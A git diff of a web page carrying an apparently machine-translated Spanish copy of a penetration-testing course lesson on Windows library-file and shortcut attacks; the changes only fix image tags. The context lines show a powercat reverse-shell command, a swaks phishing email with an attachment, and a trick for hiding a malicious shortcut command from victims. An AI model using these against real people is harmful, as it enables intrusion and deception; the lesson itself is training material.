@@ -252,22 +252,22 @@ Running without configuration file.
 </div> 
 
 <p>El resultado indica que el servidor WebDAV ahora se está ejecutando en el puerto 80. Confirmemos esto abriendo en nuestro navegador.</p>
-https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/5377fb2c3624ec7bfb55d60f8196895a-csa_sc_webdavbrowser2.png
+ <img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/5377fb2c3624ec7bfb55d60f8196895a-csa_sc_webdavbrowser2.png"/>
 <br>
 
 <p>A continuación, creemos el archivo de biblioteca de Windows. usaremos **xfreerdp** a conectarse al _Cliente137_ máquina en **192.168.50.194** a través de RDP a preparar nuestro ataque. Podemos conectarnos al sistema con _offsec_ como el nombre de usuario y _Laboratorio_ como contraseña. Esto hará que sea mucho más fácil para para construir y probar nuestro archivo de biblioteca, y más tarde, nuestro archivo de acceso directo.
 Una vez conectados, encontraremos el _Código de estudio visual_ (VSC)[5](https://portal.offsec.com/courses/pen-200-44065/learning/client-side-attacks-48976/abusing-windows-library-files-49009/obtaining-code-execution-via-windows-library-files-48979#fn-local_id_430-5) aplicación en el escritorio, que usaremos para crear nuestra biblioteca archivo. Debemos tener en cuenta que también podríamos utilizar _Bloc_ para crear el archivo. Abramos VSC haciendo doble clic en el icono.</p>
-https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/3c18f3689192eac43f9352a542fdba2c-csa_sc_win112.png
+<img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/3c18f3689192eac43f9352a542fdba2c-csa_sc_win112.png"/>
 <br>
 
 <p>En la barra de menú, haremos clic en _archivo_ > _Nuevo archivo de texto_. entonces lo haremos guarde el archivo vacío como **config.Biblioteca-ms** en el _offsec_ del usuario de oficina. Tan pronto como guardemos el archivo con esta extensión de archivo, se muestra con un icono. Si bien el ícono no parece peligroso, sí Windows no lo utiliza habitualmente y, por lo tanto, puede generar sospechas. Para aumentar las posibilidades de que nuestra víctima ejecute nuestro archivo, vamos cambiar su apariencia.</p>
-https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/d851cb673201245bd941d1299e76461d-csa_sc_vscempty3.png)
+<img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/d851cb673201245bd941d1299e76461d-csa_sc_vscempty3.png"/>
 
 <p>El La siguiente lista muestra el XML completo.:</p>
 
 
 <p>Guardemos y cerremos el archivo en Visual Studio Code. entonces lo haremos haga doble clic en **config.Biblioteca-ms** archivo en el escritorio.</p>
-https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/7624182b026f1ec571a6f48745f17a76-csa_sc_openlib.png)
+<img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/7624182b026f1ec571a6f48745f17a76-csa_sc_openlib.png"/>
 
 <p>Cuando abrimos el directorio en el Explorador, encontramos el creado previamente **prueba.txt** archivo que colocamos en el recurso compartido WebDAV. Por lo tanto, el El archivo de biblioteca funciona e incorpora la conexión al recurso compartido WebDAV..</p>
 <p>Muy lindo!</p>
@@ -288,7 +288,7 @@ powercat -c 192.168.119.3 -p 4444 -e powershell"
 </div> 
 
 <p>Ingresaremos este comando en el campo de entrada y haremos clic _Próximo_.</p>
-https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/2ad68e3a33e8ba87b2a27876c2bbf6f5-csa_sc_createshortcut2.png)
+<img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/2ad68e3a33e8ba87b2a27876c2bbf6f5-csa_sc_createshortcut2.png"/>
 
 <p>
 Si esperamos que nuestras víctimas sean lo suficientemente conocedoras de la tecnología como para realmente Compruebe hacia dónde apuntan los archivos de acceso directo, podemos usar un truco útil. Dado que nuestro comando proporcionado parece muy sospechoso, podríamos simplemente poner un delimitador y comando benigno detrás de él para impulsar el comando malicioso fuera del área visible en el menú de propiedades del archivo. Si un usuario fuera para verificar el acceso directo, solo verán el comando benigno.</p>
@@ -321,7 +321,7 @@ sudo swaks -t dave.wizzard@supermagicorp.com --from test@supermagicorp.com --att
 </code></pre>
 <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
 </div> 
-
+<img src="https://github.com/JJoosh/JJoosh.github.io/blob/main/img/WhatsApp%20Image%202025-01-14%20at%2015.35.26_d56f6322.jpg"/>
 
             `
         }
